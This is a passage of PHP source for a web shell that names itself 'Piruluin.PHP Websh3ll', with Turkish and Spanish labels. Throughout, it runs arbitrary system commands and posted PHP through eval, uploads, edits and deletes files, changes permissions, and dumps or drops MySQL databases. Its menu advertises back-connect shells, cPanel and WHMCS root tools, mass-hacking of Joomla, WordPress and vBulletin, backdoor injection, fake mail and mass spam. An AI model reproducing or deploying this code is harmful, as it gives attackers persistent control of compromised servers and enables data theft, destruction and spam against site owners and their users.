uXIbbuChtRXO8ltTgwwfQpFJr7GFWEHzwaoqgMvsqKrbcduyXKxV6xhvR2XfLQZZdqy3eHYsnEupP3tqwF8L24veakZd7C3jZMeD6QYWbbwl+E+i3mH8fHlUFS851jLgL/qvYRw+h3RrHydxMoHO0kfkP8BmLM3hBHAD/El4e/MqD/POvc6vv4G5yOqo1HTR1tHN7A+oJ/y88NmStO0+xhn4LMACJMOOyazadagAAAABJRU5ErkJggg==';
    }
    if ($mostrar_icono) {
        header('Content-type: image/gif');
        echo base64_decode($mostrar_icono);
    } else {
        echo 'kkr';
    }
}
function upload_file($dir)
{
    global $lenguaje;
    echo '<form action="?id=upload_fil3&d=' . $dir . '" method="post" enctype="multipart/form-data">
	 <input type="file" name="uploadfile" /><br />
	 <br />
	 <input type="submit" value="' . $lenguaje[17] . '" /><br /><br />';
    if (is_writable($dir)) {
        echo '<b><font color=green>Y�klenebilir -> (' . ver_permisos(fileperms($dir)) . ')</font></b>';
    } else {
        echo '<b><font color=red>Y�klenemez -> (' . ver_permisos(fileperms($dir)) . ')</font></b>';
    }
    echo '</form>
    </td>
	</tr>';
}
function f0rm_exec($dir)
{
    global $lenguaje;
    echo '<form action="?id=c0d3_3x3c&d=' . $dir . '" method="post">
	 <input type="input" name="ax3" size="50"/> <br />
	 <br />
	 <input type="submit" value="' . $lenguaje[18] . '" />';
    echo '</form>';
}
function is_disabled($funcion)
{
    $funciones_deshabilitadas = explode(',', ini_get('disable_functions'));

    return in_array($funcion, $funciones_deshabilitadas);
}
function c0d3_ex3c($cmd, $dir)
{
    global $Sonu�;
    @chdir($dir);
    if (is_callable('exec') && !is_disabled('exec')) {
        ob_start('buffer_exec');
        exec($cmd, $Sonu�ado);
        echo join("\n", $Sonu�ado);
        ob_end_flush();
    } elseif (is_callable('system') && !is_disabled('system')) {
        ob_start('buffer_exec');
        system($cmd);
        ob_end_flush();
    } elseif (is_callable('passthru') && !is_disabled('passthru')) {
        ob_start('buffer_exec');
        passthru($cmd);
        ob_end_flush();
    } elseif (is_callable('shell_exec') && !is_disabled('shell_exec')) {
        ob_start('buffer_exec');
        echo shell_exec($cmd);
        ob_end_flush();
    }

    return $Sonu�;
}
function rm_dir_pwn($px)
{
    $h = @opendir($px);
    while (false !== ($item_pwn = @readdir($h))) {
        if (('.' != $item_pwn) and ('..' != $item_pwn)) {
            if (!is_dir($px . $item_pwn)) {
                @unlink($px . $item_pwn);
            } else {
                rm_dir_pwn($px . $item_pwn . DIRECTORY_SEPARATOR);
                @rmdir($px . $item_pwn);
            }
        }
    }
    @closedir($h);
    @rmdir($px);

    return !is_dir($px);
}
function rm_items_pwn($o)
{
    $is_dir_x = is_dir($o);
    $o = str_replace('\\', DIRECTORY_SEPARATOR, $o);
    if (is_dir($o)) {
        if (DIRECTORY_SEPARATOR != substr($o, -1)) {
            $o .= DIRECTORY_SEPARATOR;
        }

        return rm_dir_pwn($o);
    } elseif (is_file($o)) {
        return @unlink($o);
    } else {
        if ($is_dir_x) {
            $sa_dir = is_dir($o);
            rm_dir_pwn($o);
            if (!$sa_dir) {
                return true;
            } else {
                return false;
            }
        }
    }
}
function login_form_mysql()
{
    global $lenguaje;
    echo '<div align="center">
	 <form method="GET" action="">
	 <table width="236" border="0" cellspacing="0" cellpadding="0" align="center">
	 <tr>
	 <td width="92">Host:</td>
	 <td width="144" align="right"><input type="text" name="hostm" id="mysql_host" value="localhost"></td>
	 </tr>
	 <tr>
	 <td>' . $lenguaje[19] . '</td>
	 <td align="right"><input type="text" name="userm" id="mysql_user"></td>
	 </tr>
	 <tr>
	 <td>' . $lenguaje[20] . '</td>
	 <td align="right"><input type="text" name="passm" id="mysql_password">
	 <input type="hidden" name="id" value="log_mysql"></td>
	 </tr>
	 </table>
	 <br />
	 <input type="submit" value="' . $lenguaje[21] . '">
	 <br />
	 </form>
	 </div>';
}
function post_form_mysql($host, $user, $pass)
{
    global $conexion;
    $conexion = @mysql_pconnect($host, $user, $pass);
    if ($conexion) {
        return true;
    } else {
        return false;
    }
}
function listar_dbs()
{
    global $conexion,$dir,$lenguaje;
    echo '<div align="center"><br /> <a href="?id=mysql_login&d=' . $dir . '">' . $lenguaje[25] . '</a><br/><br/>
	 <table cellspacing=1 cellpadding=2>';
    $mysql_list_db = @mysql_list_dbs($conexion);
    $num = @mysql_num_rows($mysql_list_db);
    for ($i = 0; $i < $num; ++$i) {
        $dbname = @mysql_dbname($mysql_list_db, $i);
        echo '<tr>
		 <td>' . htmlspecialchars($dbname) . '</td>
		 <td><a href="?id=list_tb&userm=' . htmlentities($_GET['userm']) . '&passm=' . htmlentities($_GET['passm']) . '&hostm=' . htmlentities($_GET['hostm']) . '&dbname=' . htmlspecialchars($dbname) . '">' . $lenguaje[22] . '</a></td>
		 <td><a href="?id=drop_db&userm=' . htmlentities($_GET['userm']) . '&passm=' . htmlentities($_GET['passm']) . '&hostm=' . htmlentities($_GET['hostm']) . '&dbname=' . htmlspecialchars($dbname) . '">' . $lenguaje[23] . '</a></td>
		 <td><a href="?id=dump3r&userm=' . htmlentities($_GET['userm']) . '&passm=' . htmlentities($_GET['passm']) . '&hostm=' . htmlentities($_GET['hostm']) . '&db=' . htmlspecialchars($dbname) . '">' . $lenguaje[24] . '</a></td>
		 </tr>';
    }
    echo '</table></div>';
}
function listar_tbs($db)
{
    global $conexion,$lenguaje;
    $list_tables = @mysql_list_tables($db);
    $num = @mysql_num_rows($list_tables);
    if ($num) {
        echo '<div align="center">' . htmlspecialchars($db) . ' - 
		 <a href="?id=listar_dbs&userm=' . htmlspecialchars($_GET['userm']) . '&passm=' . htmlspecialchars($_GET['passm']) . '&hostm=' . htmlspecialchars($_GET['hostm']) . '">' . $lenguaje[25] . '</a><br/><br/>
		 <table cellspacing=1 cellpadding=2>';
        for ($i = 0; $i < $num; ++$i) {
            $nombre_tabla = @mysql_tablename($list_tables, $i);
            echo '<tr>
					 <td>
					 ' . htmlspecialchars($nombre_tabla) . '
					 </td>
					 <td>
					 <a href="?id=ver_schema&userm=' . htmlentities($_GET['userm']) . '&passm=' . htmlentities($_GET['passm']) . '&hostm=' . htmlentities($_GET['hostm']) . '&tbname=' . htmlspecialchars($nombre_tabla) . '&db=' . htmlspecialchars($db) . '">Schema</a>
					 </td>
					 <td>
					 <a href="?id=mostrar_datos&userm=' . htmlentities($_GET['userm']) . '&passm=' . htmlentities($_GET['passm']) . '&hostm=' . htmlentities($_GET['hostm']) . '&tbname=' . htmlspecialchars($nombre_tabla) . '&db=' . htmlspecialchars($db) . '">' . $lenguaje[26] . '</a>
					 </td>
					 <td>
					 <a href="?id=drop_tb&userm=' . htmlentities($_GET['userm']) . '&passm=' . htmlentities($_GET['passm']) . '&hostm=' . htmlentities($_GET['hostm']) . '&dbname=' . htmlspecialchars($db) . '&tbname=' . htmlspecialchars($nombre_tabla) . '">' . $lenguaje[23] . '</a>
					 </td>
					 <td>
					 <a href="?id=dump3r&userm=' . htmlentities($_GET['userm']) . '&passm=' . htmlentities($_GET['passm']) . '&hostm=' . htmlentities($_GET['hostm']) . '&tablename=' . htmlspecialchars($nombre_tabla) . '&db=' . htmlspecialchars($db) . '">' . $lenguaje[24] . '</a>
					 </td>
					 </tr>';
        }
        echo '</table></div>';
    } else {
        echo $lenguaje[27] . '<br /> <br /> <a href="?id=listar_dbs&userm=' . htmlspecialchars($_GET['userm']) . '&passm=' . htmlspecialchars($_GET['passm']) . '&hostm=' . htmlspecialchars($_GET['hostm']) . '">' . $lenguaje[25] . '</a>';
    }
}
function ver_schema($nombre_tabla, $dbname)
{
    global $conexion,$lenguaje;
    $query_show_fields = @mysql_db_query($dbname, "SHOW fields FROM $nombre_tabla");
    $num = @mysql_num_rows($query_show_fields);
    echo '<div align="center">';
    echo $nombre_tabla . ' -  <a href="?id=list_tb&userm=' . htmlspecialchars($_GET['userm']) . '&passm=' . htmlspecialchars($_GET['passm']) . '&hostm=' . htmlspecialchars($_GET['hostm']) . '&dbname=' . htmlspecialchars($dbname) . '">' . $lenguaje[25] . '</a> <br/><br/>
	 <table cellspacing=1 cellpadding=2 border=1>
	 <tr>
	 <td>' . $lenguaje[29] . '</td>
	 <td>' . $lenguaje[30] . '</td>
	 <td>' . $lenguaje[31] . '</td>
	 <td>' . $lenguaje[32] . '</td>
	 <td>' . $lenguaje[33] . '</td>
	 <td>' . $lenguaje[34] . '</td>
	 </tr>';
    for ($i = 0; $i < $num; ++$i) {
        $field = @mysql_fetch_array($query_show_fields);
        echo '<tr>
		  <td>&nbsp;' . $field['Field'] . '</td>
		  <td>&nbsp;' . $field['Type'] . '</td>
		  <td>&nbsp;' . $field['Null'] . '</td>
		  <td>&nbsp;' . $field['Key'] . '</td>
		  <td>&nbsp;' . $field['Default'] . '</td>
		  <td>&nbsp;' . $field['Extra'] . '</td>
		  </tr>';
    }
    echo '</table>';
    echo '</div>';
}
function paginar($table, $db)
{
    global $conexion;
    @mysql_select_db($db);
    $sergio = @mysql_query("SELECT * FROM $table");
    $total_paginas = mysql_num_rows($sergio) / 30;
    for ($pag = 0; $pag < $total_paginas; ++$pag) {
        $paginas[] = '<a href="?id=mostrar_datos&userm=' . htmlspecialchars($_GET['userm']) . '&passm=' . htmlspecialchars($_GET['passm']) . '&hostm=' . htmlspecialchars($_GET['hostm']) . '&tbname=' . htmlspecialchars($_GET['tbname']) . '&db=' . htmlspecialchars($_GET['db']) . '&pag=' . ($pag * 30) . '">' . $pag . '</a>';
    }
    echo '<table width="400" border="1" cellpadding="0" cellspacing="0">
	<tr>
	<td align="center">';
    echo '<font style="font-size:9px; font-family: Verdana">';
    $paginas_z = implode(' ', $paginas);
    if ($paginas_z) {
        echo $paginas_z;
    } else {
        echo 'Err0r';
    }
    echo '</font></td>
	  </tr>
	</table>';
}
function mostrar_datos($tablename, $db, $inicio_limit, $fin_limit)
{
    global $conexion,$total_paginas,$lenguaje;
    @mysql_select_db($db);
    if ('1' == $total_paginas) {
        $query_pwn = "SELECT * FROM $tablename";
    } else {
        $query_pwn = "SELECT * FROM $tablename LIMIT $inicio_limit,$fin_limit";
    }
    $query_columnas = @mysql_query("SHOW COLUMNS FROM $tablename");
    $query_datos = @mysql_query($query_pwn);
    $control_datos = @mysql_fetch_row($query_datos);
    if ($control_datos) {
        @mysql_free_Sonu�($query_datos);
        $query_datos = @mysql_query($query_pwn);
        echo '<div align="center">';
        echo '<table cellspacing=1 cellpadding=1 border=1>';
        echo '<tr>';
        while ($columna = @mysql_fetch_row($query_columnas)) {
            echo '<td>' . $columna[0] . '</td>';
            $columnas_matriz[] = $columna[0];
            flush();
            ob_flush();
        }
        echo '</tr>';
        while ($datos = @mysql_fetch_row($query_datos)) {
            echo '<tr>';
            for ($i = 0; $i < count($columnas_matriz); ++$i) {
                echo '<td>&nbsp;' . htmlspecialchars($datos[$i]) . '</td>';
            }
            flush();
            ob_flush();
            echo '</tr>';
        }
        echo '</table>';
        echo '</div>';
    } else {
        echo $lenguaje[35];
    }
}
function dump3r($user, $password, $host, $db, $tablename = '')
{
    if ('' == !$tablename) {
        $filename = $tablename;
    } else {
        $filename = $db;
    }
    header("Content-disposition: filename=$filename.sql");
    header('Content-type: application/octetstream');
    header('Pragma: no-cache');
    header('Expires: 0');
    $query_dump = mysql_query('show variables');
    while (1) {
        $array_r0w = mysql_fetch_row($query_dump);
        if (false == $array_r0w) {
            break;
        }
        if ('basedir' == $array_r0w[0]) {
            $bindir = $array_r0w[1] . 'bin/';
        }
    }
    echo base64_decode('LS0gRHVtcDNkIGJ5IFBpcnVsaW4uUEhQIFdlYnNoM2xsIHYxLjAgYzBkZWQgYnkgcjBkcjEgOkw=');
    echo '
	 ';
    passthru($bindir . "mysqldump --host=$host --user=$user --password=$password $db $tablename");
}
function drop_db($dbname)
{
    global $conexion,$lenguaje;
    if (isset($_POST['ok'])) {
        if (mysql_query("DROP DATABASE $dbname", $conexion)) {
            echo '<b>' . $lenguaje[36] . '</b><br /><br />';
            listar_dbs();
        } else {
            echo '<b>' . $lenguaje[36] . '</b><br /><br />';
            listar_dbs();
        }
    } else {
        echo '<form method="post" action="">' . $lenguaje[38] . ' ' . htmlspecialchars($dbname) . ' ?
		 <br />
		 <br />
		 <input type="hidden" name="ok" value="1">
		 <input type="submit" value="' . $lenguaje[39] . '">
		 </form>';
    }
}
function drop_tb($tbname, $dbname)
{
    global $conexion,$lenguaje;
    if (isset($_POST['ok'])) {
        @mysql_select_db($dbname);
        if (mysql_query("DROP TABLE $tbname", $conexion)) {
            echo '<b>' . $lenguaje[40] . '</b><br /> <br />';
            listar_tbs($_GET['dbname']);
        } else {
            echo '<b>' . $lenguaje[41] . '</b><br /> <br />';
            listar_tbs($_GET['dbname']);
        }
    } else {
        echo '<form method="post" action="">' . $lenguaje[42] . ' ' . htmlspecialchars($tbname) . ' ?
		 <br />
		 <br />
		 <input type="hidden" name="ok" value="1">
		 <input type="submit" value="' . $lenguaje[39] . '">
		 </form>';
    }
}
function form_mailer()
{
    global $lenguaje;
    echo '<form method="post" action="">
	 <table width="655" border="0" cellspacing="0" cellpadding="0">
	 <tr>
	 <td width="115"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">' . $lenguaje[43] . ': </font></td>
	 <td width="10">&nbsp;</td>
	 <td width="317"><input name="email" type="text" id="email" size="40"></td>
	 <td width="19" rowspan="4">&nbsp;</td>
	 <td width="197"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">' . $lenguaje[44] . ':</font></td>
	 </tr>
	 <tr>
	 <td><p><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">' . $lenguaje[45] . '</font>
	 <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">:</font></p></td>
	 <td height="22">&nbsp;</td>
	 <td><input name="titulo" type="text" id="titulo" size="50"></td>
	 <td rowspan="3"><textarea name="maillist" cols="30" rows="12" id="maillist"></textarea></td>
	 </tr>
	 <tr>
	 <td><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">' . $lenguaje[3] . ':</font></td>
	 <td>&nbsp;</td>
	 <td><input name="nombre" type="text" id="nombre" size="40"></td>
	 </tr>
	 <tr>
	 <td><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">' . $lenguaje[46] . ': </font></td>
	 <td valign="top">&nbsp;</td>
	 <td><textarea name="contenido" cols="50" rows="9" id="contenido"></textarea></td>
	 </tr>
	 </table>
	 <div align="center">
	 <input type="submit" value="' . $lenguaje[17] . '">
	 </div>
	 </form>';
}
function crawl3r()
{
    global $lenguaje;
    echo '<form method="GET" action="">
			<input type="hidden" name="id" value="crawl3r">
			<table width="395" border="0" cellspacing="0" cellpadding="0">
			<tr>
			<td width="95">Link:</td>
			<td width="300"><input type="text" name="url" size="50"></td>
			</tr>
			<tr>
			<td colspan="2" align="center"><br><input type="submit" value="OK"></td>
			</tr>
			</table>
			</form><br />';
    if (((isset($_GET['url'])) and (!isset($_GET['b64_url']))) or (((!isset($_GET['url'])) and (isset($_GET['b64_url']))))) {
        if (isset($_GET['url'])) {
            $str = @file_get_contents($_GET['url']);
            $url = $_GET['url'];
            echo htmlentities(utf8_decode($url));
        } else {
            $str = @file_get_contents(base64_decode($_GET['b64_url']));
            $url = base64_decode($_GET['b64_url']);
            echo htmlentities(utf8_decode($url));
        }
        echo '<br /><br />';
        if ($str) {
            $doc = new DOMDocument();
            @$doc->loadHTML($str);
            $hrefs = $doc->getElementsByTagName('a');
            if ($hrefs) {
                echo '<table border="1" cellspacing="0" cellpadding="0">';
                $i = 0;
                foreach ($hrefs as $href) {
                    $oki = $href->getAttribute('href');
                    if (('' != trim($oki)) && !(@in_array($oki, $matches_href)) && ('/' != trim($oki)) && ('#' != trim($oki[0])) && ('javascript' != substr(trim($oki), 0, 10))) {
                        if ('h' != $oki[0]) {
                            echo '<tr>
							<td>' . $i . '</td>
							<td width="50">-----</td>
							<td>';
                        } else {
                            echo '<tr>
							<td>' . $i . '</td>
							<td width="50"><a href="?id=crawl3r&b64_url=' . base64_encode($oki) . '">Scan it!</a></td>
							<td>';
                        }
                        if ($oki) {
                            echo htmlspecialchars(utf8_decode($oki));
                        } else {
                            echo '&nbsp;';
                        }
                        echo '</td>
							</tr>';
                        ++$i;
                    }
                }
                echo '</table>';
            }
        } else {
            echo $lenguaje[96] . ' <br /><br /><br />';
        }
    }
}
function borrrar_checkbox($dir_pwn, $directorios, $archivos)
{
    global $lenguaje;
    if (isset($_POST['directorios_confirmados']) or isset($_POST['archivos_confirmados'])) {
        $directorios_confirmados = $_POST['directorios_confirmados'];
        $archivos_confirmados = $_POST['archivos_confirmados'];
        for ($i = 0; $i < count($directorios_confirmados); ++$i) {
            $rm_dir = rm_items_pwn(realpath($directorios_confirmados[$i] . '/'));
            if ($rm_dir) {
                echo '<b><font color="green">' . $lenguaje[68] . '! -> ' . htmlentities(stripslashes($directorios_confirmados[$i])) . '</font></b><br /><br />';
            } else {
                echo '<b><font color="red">Err0r !!!  -> ' . htmlentities(stripslashes($directorios_confirmados[$i])) . '</font></b><br /<br />';
            }
        }
        for ($i = 0; $i < count($archivos_confirmados); ++$i) {
            $rm_items = rm_items_pwn(realpath($archivos_confirmados[$i]));
            if ($rm_items) {
                echo '<b><font color="green">' . $lenguaje[69] . '! -> ' . htmlentities(stripslashes($archivos_confirmados[$i])) . '</font></b><br /><br />';
            } else {
                echo '<b><font color="red">Err0r !!!  -> ' . htmlentities(stripslashes($archivos_confirmados[$i])) . '</font></b><br /<br />';
            }
        }
        echo '<form action="" method="GET">
		<input type="submit" value="' . $lenguaje[57] . '"></form>';
    } else {
        echo '<br />' . $lenguaje[86] . '<br />';
        echo '<form action="" method="post">
		<input type="hidden" name="menu_dirs" value="borrar">
		<table height="20" border="1" cellpadding="0" cellspacing="0">';
        for ($i = 0; $i < count($directorios); ++$i) {
            $dir_ok = realpath($dir_pwn . '/' . $directorios[$i]);
            echo '<tr>
			<td>' . $dir_ok . '</td>
			<td width="20"><input type="checkbox" name="directorios_confirmados[]" value="' . $dir_ok . '" checked>
			</td>
			</tr>';
        }
        for ($i = 0; $i < count($archivos); ++$i) {
            $archivo_ok = realpath($dir_pwn . '/' . $archivos[$i]);
            echo '<tr>
			<td>' . $archivo_ok . '</td>
			<td width="20"><input type="checkbox" name="archivos_confirmados[]" value="' . $archivo_ok . '" checked>
			</td>
			</tr>';
        }
        echo '</table><br />
		<input type="submit" value="' . $lenguaje[17] . '">
		</form>';
    }
}
function reverse_dns()
{
    if ($_POST) {
        $web = $_POST['url'];
        if (ereg('http://', $web)) {
            $web = str_replace('http://', '', $web);
        }
        if ('/' == $web[strlen($web) - 1]) {
            $web = substr($web, 0, -1);
        }
        $ip = gethostbyname($web);
        $source = file_get_contents('http://www.ip-adress.com/reverse_ip/' . $ip);
        preg_match_all('|<a href="/whois/(.*?)">Whois</a>|', $source, $sitios);
        echo 'Web: ' . $web . ' <br />
			  IP : ' . $ip . ' <br />
			  Total de sitios (Reverse DNS): ' . count($sitios[1]) . '<br /><br />';
        foreach ($sitios[1] as $site) {
            echo '<a href="http://' . htmlentities($site) . '">' . htmlentities($site) . '</a><br />';
        }
    } else {
        echo '<form action="" method="POST">
		<table>
		<tr>
		<td>Url (ej: www.google.com.tr): </td>
		<td><input type="text" name="url"></td>
		<tr/>
		</table>
		<br />
		<input type="submit" value="Checkear">
		</form>';
    }
}
function pwn_chmod($pwn)
{
    global $lenguaje;
    $old = substr(sprintf('%o', @fileperms($pwn)), -4);
    if (is_numeric($old)) {
        if (isset($_POST['nuevos_permisos'])) {
            if (is_numeric($_POST['nuevos_permisos'])) {
                if (@chmod($pwn, $_POST['nuevos_permisos'])) {
                    echo $lenguaje[90];
                } else {
                    echo $lenguaje[91];
                }
            } else {
                echo $lenguaje[92];
            }
            echo '<br /><br />';
        } else {
            echo realpath($pwn) . '<br /><br /><form method="post" action="">
			' . $lenguaje[93] . ':
			<input type="text" id="old" disabled id="old" readonly="readonly" value="' . $old . '">
			<br /><br />' . $lenguaje[94] . ':
			<input type="text" name="nuevos_permisos" id="nuevos_permisos">
			<br /><br />
			<input type="submit" value="editar">
			</form><br />';
        }
    } else {
        echo $lenguaje[89] . '<br /><br />';
    }
}
if (isset($_GET['id'])) {
    $id_menu = $_GET['id'];
} else {
    $id_menu = 'dir';
}
if ('icono' == $id_menu) {
    mostrar_iconos($_GET['tipo']);
    exit();
}
if (('phpinfo' != $id_menu) && ('proxy' != $id_menu) && ('fdown' != $id_menu) && ('dump3r' != $id_menu)) {
    $homedir = getcwd();
    if (isset($_GET['d'])) {
        $dir = realpath($_GET['d']);
    }
    css();
    header_index();
    if ('reverse' == $_GET[id]) {
        $site = "$_GET[site]";
        $kaynak = file_get_contents("http://whatisonip.com/domain-info/$site");
        preg_match_all('#<a href="/redir/?(.*?)">#si', $kaynak, $kursat);
        foreach ($kursat[1] as $cem) {
            echo str_replace('?', '', $cem) . '<br>';
        }
    }
    $site = getenv('HTTP_HOST');
    echo "<font color=grey>Sunucu reverse yap:</font><a href=?id=reverse&site=$site>$site</a>";
    echo '<table style="Border-Collapse: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#f6f2f2 borderColorLight=#c0c0c0 border=1>
	 <tr valign="top">
	 <td align="center">' . $lenguaje[52] . ': 
	 <a href="http://' . gethostbyname($_SERVER['HTTP_HOST']) . '/">' . gethostbyname($_SERVER['HTTP_HOST']) . '</a> | 
	 ' . $lenguaje[53] . ': <b><font color="red">' . $_SERVER['REMOTE_ADDR'] . '</font></b> | ';
    echo 'cURL: <b>';
    if (function_exists('curl_version')) {
        echo '<font color=green>' . $lenguaje[54] . '</font></b> | ';
    } else {
        echo '<font color=red>' . $lenguaje[55] . '</font></b> | ';
    }
    echo 'MySQL: <b>';
    if (function_exists('mysql_connect')) {
        echo '<font color=green>' . $lenguaje[54] . '</font></b> | ';
    } else {
        echo '<font color=red>' . $lenguaje[55] . '</font></b> | ';
    }
    echo 'MSSQL: <b>';
    if (function_exists('mssql_connect')) {
        echo '<font color=green>' . $lenguaje[54] . '</font></b> | ';
    } else {
        echo '<font color=red>' . $lenguaje[55] . '</font></b> | ';
    }
    echo 'PostgreSQL: <b>';
    if (function_exists('pg_connect')) {
        echo '<font color=green>' . $lenguaje[54] . '</font></b> | ';
    } else {
        echo '<font color=red>' . $lenguaje[55] . '</font></b> | ';
    }
    echo 'Perl: <b>';
    if (c0d3_ex3c('perl -h', $dir)) {
        echo '<font color=green>' . $lenguaje[54] . '</font></b> | ';
    } else {
        echo '<font color=red>' . $lenguaje[55] . '</font></b> | ';
    }
    echo 'Oracle: <b>';
    if (function_exists('ocilogon')) {
        echo '<font color=green>' . $lenguaje[54] . '</font></b>';
    } else {
        echo '<font color=red>' . $lenguaje[55] . '</font></b>';
    }
    echo '</td>
	 </tr>
	 <tr valign="top">
	 <td align="center">' . $lenguaje[56] . ': ' . disable_functions() . '</td>
	 </tr>
	 </table>';
    echo '<br />
<a href="?"><input type="submit" value="Dosya y�netimi"></a> ~  
<a href=?id=php_exec&d=' . $dir . '><input type="submit" value="PHP injex"></a> ~ 
<a href=?id=phpini><input type="submit" value="G�venlikleri kapat"></a> ~ <a href=?id=get><input type="submit" value="Siyanur5x"></a> ~ <a href=?id=angel><input type="submit" value="AngeLShell"></a> ~ <a href=?id=passwd><input type="submit" value="Passwd"></a> ~ <a href=?id=hta><input type="submit" value="Mod_security"></a> ~ <a href=?id=usr><input type="submit" value="Users"></a> ~ <a href=?id=cgitelnet><input type="submit" value="CGI Telnet"></a> ~ <a href=?id=tmplink><input type="submit" value="Tmplink"></a> ~ <a href=?id=php44><input type="submit" value="PHP4"></a> ~ <a href=?id=namedbypass><input type="submit" value="Auto Named"></a> ~ <a href=?id=perm><input type="submit" value="Symlink Auto"></a>
~ <a href=?id=symlist><input type="submit" value="Symlink"></a> ~ <a href=?id=manuelsym><input type="submit" value="Manuel Symlink"></a> ~ <a href=?id=yukle><input type="submit" value="Upload"></a></font> ~ <a href=?id=passwd1><input type="submit" value="Passwd 2"></a> ~ <a href=?id=joomlares><input type="submit" value="Joomla admin resetle"></a> ~ <a href=?id=pg><input type="submit" value="Pagerank"></a></font> ~ <a href=?id=cpanel><input type="submit" value="CpanelPwn"></a></font> ~ <a href=?id=bc><input type="submit" value="BackConnect"></a></font> ~ <a href=?id=feykmail><input type="submit" value="Fake mail"></a></font> ~ <a href=?id=eval><input type="submit" value="Eval �al��t�r"></a></font>
 ~ <a href=?id=command2><input type="submit" value="Base64 Komut"></a>  ~ <a href=?id=lite1><input type="submit" value="LitespeedPwn 1"></a>  ~ <a href=?id=md5><input type="submit" value="Md5 olu�tur"></a>  ~ <a href=?id=uzakupload><input type="submit" value="Uzaktan y�kle"></a>  ~ <a href=?id=komut><input type="submit" value="Komut sat�r�"></a> ~ <a href=?id=whmcs><input type="submit" value="Whmcs r00t"></a> ~ <a href=?id=hash><input type="submit" value="Hash Generator"></a>  ~ <a href=?id=wpres><input type="submit" value="Wordpress admin resetle"></a>  ~ <a href=?id=shellbul><input type="submit" value="Shell bul"></a> ~ <a href=?id=reverse_dns><input type="submit" value="Reverse DNS"></a> ~ 
<a href=?id=crawl3r><input type="submit" value="Crawler"></a> ~ <a href=?id=mail3r><input type="submit" value="SpamMailMass"></a> ~ <a href="?id=mysql_login&d=' . $dir . '"><input type="submit" value="Mysql Ba�lan"></a> ~ <a href=?id=CloudBypass><input type="submit" value="CloudFlare"></a> ~ <a href=?id=sifrele><input type="submit" value="Kod �ifrele"></a> ~ <a href=?id=joomla><input type="submit" value="Joomla mass hack"></a> ~ <a href=?id=vb><input type="submit" value="Vb mass hack"></a> ~ <a href=?id=wp><input type="submit" value="Wp mass hack"></a> ~ <a href=?id=Cmdinject><input type="submit" value="CMD Backdoor inject"></a> ~ <a href=?id=reversem><input type="submit" value="Reverse ip"></a>

';
}
if (('dir' == $id_menu) or (!$id_menu)) {
    if ('' == trim($dir)) {
        $dir = getcwd();
    }
    listar_archivos($dir);
} elseif (('a_edit' == $id_menu) && ('' == !trim($_GET['d'])) && ('' == !trim($_GET['a']))) {
    echo '<br /><form method="post" action="">
<input type="submit" value="Save" />
<input type="reset" value="Reset" />
<input type="button" value="Back" onclick="history.go(-1)"><br />
<br />
' . $lenguaje[60] . ':<br />
<a href="?id=a_edit&amp;d=' . $dir . '&amp;a=' . urlencode($_GET['a']) . '&w=' . base64_encode('fread') . '">fread</a> - 
<a href="?id=a_edit&amp;d=' . $dir . '&amp;a=' . urlencode($_GET['a']) . '&w=' . base64_encode('readfile') . '">readfile</a> - 
<a href="?id=a_edit&amp;d=' . $dir . '&amp;a=' . urlencode($_GET['a']) . '&w=' . base64_encode('file_get_contents') . '">file_get_contents</a><br />

<br /><br />';
    if (isset($_POST['c0d3'])) {
        $fopen = @fopen(realpath($dir . '/' . $_GET['a']), 'w+');
        $pwz = @fwrite($fopen, stripslashes($_POST['c0d3']));
        @fclose($fopen);
        if ($pwz) {
            echo '<b>OK !!! -> <font color="green">' . $lenguaje[61] . '</font></b><br />';
        } else {
            echo '<b>Err0r !!! -> <font color="red">' . $lenguaje[62] . '</font></b><br />';
        }
    }
    echo '<textarea name="c0d3" cols="80" rows="20">';
    if ($_GET['w'] == base64_encode('fread')) {
        $fopen = @fopen(realpath($dir . '/' . $_GET['a']), 'r');
        $tam = @filesize(realpath($dir . '/' . $_GET['a']));
        if ($tam > 0) {
            $read = @fread($fopen, $tam);
            echo htmlentities($read);
        }
    } elseif ($_GET['w'] == base64_encode('readfile')) {
        ob_start('buffer_exec');
        readfile(realpath($dir . '/' . $_GET['a']));
        ob_end_flush();
        echo $Sonu�;
    } else {
        echo htmlentities(file_get_contents(realpath($dir . '/' . $_GET['a'])));
    }
    echo '</textarea></form>';
} elseif ('phpinfo' == $id_menu) {
    phpinfo();
} elseif ('php_exec' == $id_menu) {
    if (isset($_POST['c0d3_3x3c'])) {
        @chdir($dir);
        echo '<textarea cols="100" rows="16" name="phpcode">';
        ob_start('buffer_exec');
        eval(stripslashes($_POST['c0d3_3x3c']));
        ob_end_flush();
        echo $Sonu�;
        echo '</textarea><br /><br />';
    }
    echo $lenguaje[63] . '<br />
<form method="post" action="">
<textarea name="c0d3_3x3c" cols="80" rows="12">';
    if (isset($_POST['c0d3_3x3c'])) {
        echo stripslashes(htmlspecialchars($_POST['c0d3_3x3c']));
    }
    echo '</textarea><br /><br />
<input type="submit" value="OK">
<input type="reset" value="Reset">
</form>';
} elseif (('upload_fil3' == $id_menu) && (isset($_FILES['uploadfile']))) {
    global $_FILES;
    global $dir;
    $uploadfile = $_FILES['uploadfile'];
    if (!empty($uploadfile['tmp_name'])) {
        if (empty($uploadfilename)) {
            $destin = $uploadfile['name'];
        } else {
            $destin = $userfilename;
        }
        if (!move_uploaded_file($uploadfile['tmp_name'], $dir . '/' . $destin)) {
            echo $lenguaje[64] . ' ' . $uploadfile['name'] . ' (' . $lenguaje[65] . '"' . $uploadfile['tmp_name'] . '" ' . $lenguaje[66] . ' ' . $dir . '"!<br />';
        } else {
            echo '<font color="green">' . $lenguaje[67] . ' ("' . $uploadfile['name'] . '" ' . $lenguaje[66] . ' -> ' . $dir . ')</font><br /><br />';
        }
    }
    listar_archivos($dir);
} elseif ('f0rm_exec' == $id_menu) {
    f0rm_exec($dir);
} elseif ('c0d3_3x3c' == $id_menu) {
    f0rm_exec($dir);
    echo '<textarea name="c0d3" cols="80" rows="20">' . c0d3_ex3c($_POST['ax3'], $dir) . '</textarea><br />';
} elseif ('upload_fil3' == $id_menu) {
    echo '<b>' . htmlentities($dir) . '</b><br /><br />';
    upload_file($dir);
} elseif (('rmdir' == $id_menu) && ('' == !trim($_GET['d1r']))) {
    if (isset($_POST['rm_ok'])) {
